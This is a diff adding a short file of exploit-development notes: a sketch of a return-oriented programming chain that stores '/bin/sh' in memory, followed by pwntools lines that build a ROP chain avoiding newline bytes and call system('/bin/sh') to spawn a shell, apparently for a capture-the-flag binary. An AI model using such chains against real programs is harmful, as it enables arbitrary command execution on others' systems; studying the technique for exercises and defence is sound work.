@@ -1,0 +1,14 @@
+addr of: pop rdi; ret
+rdi = "/bin/sh"
+addr of: pop rax; ret
+b'/bin/sh\0'
+addr of: mov [rdi], rax; ret
+addr of: symbol
+
+
+
+
+
+pwn.ROP(binary, badchars=b'\n')
+rop.call(rop.ret)
+rop.call(binary.symbols['system'], [next(binary.search(b'/bin/sh'))])
